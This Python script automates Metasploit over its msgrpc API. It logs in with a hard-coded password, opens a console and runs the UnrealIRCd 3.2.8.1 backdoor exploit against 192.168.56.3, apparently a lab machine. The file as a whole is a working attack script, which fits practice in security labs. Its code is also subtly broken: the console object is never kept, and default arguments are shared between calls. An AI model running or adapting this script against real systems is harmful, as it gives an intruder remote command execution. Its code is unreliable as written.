# A file designated for creating an msf console and writing to it.

import msgpack, http.client, time, sys, random, subprocess

target_host = "192.168.56.3"

class Msfrpc:
    def __init__(self,opts=[]):
        self.host = "127.0.0.1"
        self.port = 55552
        self.token = False
        self.auth = False
        self.client = http.client.HTTPConnection(self.host,self.port)
        self.console_id = ''
        self.session_count = 0
        self.session_created = False

    def encode(self, data):
        return msgpack.packb(data)
    def decode(self,data):
        return msgpack.unpackb(data)

    def bytes_to_dict(self,bytes_dict):
        out = {}
        for attrib,value in bytes_dict.items():
            if type(value) is not bytes:
                out.update({attrib.decode('utf-8'):value})
            else:
                out.update({attrib.decode('utf-8'):value.decode('utf-8')})
        return out

    def call(self,meth,opts=[]):
        if self.console_id:
            opts.insert(0,self.console_id)

        if meth != "auth.login":
            opts.insert(0,self.token)

        opts.insert(0,meth)
        params = self.encode(opts)
        self.client.request("POST","/api/",params,{"Content-type" : "binary/message-pack"})
        resp = self.client.getresponse()
        if meth == 'console.write':
            return self.wait(meth)
        else:
            return self.bytes_to_dict(self.decode(resp.read()))

    def wait(self,opts):
        load = ''
        res = self.call('console.read',[])
        print(res)
        if res['busy'] == False:
            time.sleep(3)
        while res['busy'] == True:
            time.sleep(1)
            res = self.call('console.read',[])
            load  = random.randint(0,30) * '.'
            print(load + ' '*30,end='\r')
        return res

def start():
    #print(c.call('session.list',[]))
    try:
        print(c.console_id)
        c.call('console.read',[])
        search_res = c.call('console.write',['search unreal_ircd_3281_backdoor\n'])['data'].split()
        print(search_res)
        exp_path = [line.split()[0] for line in search_res if 'exploit' in line][0]
        c.call('console.write',['use '+exp_path+'\n'])
        c.call('console.write',['show options\n'])
        c.call('console.write',['set RHOST '+target_host+'\n'])
        c.call('console.write',['exploit\n'])
        c.call('console.destroy',[])
        print('done.')
    except Exception as e:
        print(e)
        c.call('console.destroy',[])
        exit(1)

def main():
    msf_cmd = ["msfconsole -x 'load msgrpc Pass=abc123'"]
    msf = subprocess.Popen(msf_cmd,shell=True,stderr=subprocess.PIPE)
    print(msf.communicate())
    msf.kill()

def create_console():
    c = Msfrpc({})
    c.auth = c.call('auth.login',['msf','abc123'])
    print(c.auth)
    c.token = c.auth['token']
    c.console_id = c.call('console.create',[])['id']
    return c

if __name__ == '__main__':
    create_console()
    #main()
    start()